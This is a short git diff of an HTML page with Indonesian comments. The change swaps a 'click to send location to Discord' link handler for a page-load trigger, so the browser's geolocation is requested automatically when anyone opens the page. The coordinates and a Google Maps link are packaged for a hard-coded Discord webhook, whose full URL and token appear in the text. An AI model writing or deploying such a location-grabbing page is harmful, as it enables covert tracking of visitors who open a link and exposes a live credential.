@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,14 +6,12 @@
   <title>Document</title>
 </head>
 <body>
-  <a href="#" id="getLocationLink">Klik untuk kirim lokasi ke Discord</a>
+  <a href="#" id="getLocationLink">Klik s untuk kirim lokasi ke Discord</a>
 </body>
 </html>
 
 <script>
-document.getElementById('getLocationLink').addEventListener('click', function(event) {
-  event.preventDefault();
-
+window.addEventListener('load', function() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(function(position) {
       const latitude = position.coords.latitude;
@@ -23,7 +20,7 @@ document.getElementById('getLocationLink').addEventListener('click', function(ev
       // URL webhook Discord (ganti dengan webhook kamu)
       const webhookURL = 'https://discord.com/api/webhooks/1418531912280051853/qc2HwlKeEiDrV_OmmbqMcGr6WJvO9ud-7qEx0j9O4SVcY4Ba1f4UPwAyCvyQUejGY2eI';
 
-      // Payload yang akan dikirim ke Discord
+      // Payload yang akan dikirim ke Discord 
       const payload = {
         content: `Lokasi pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://www.google.com/maps?q=${latitude},${longitude}`
       };
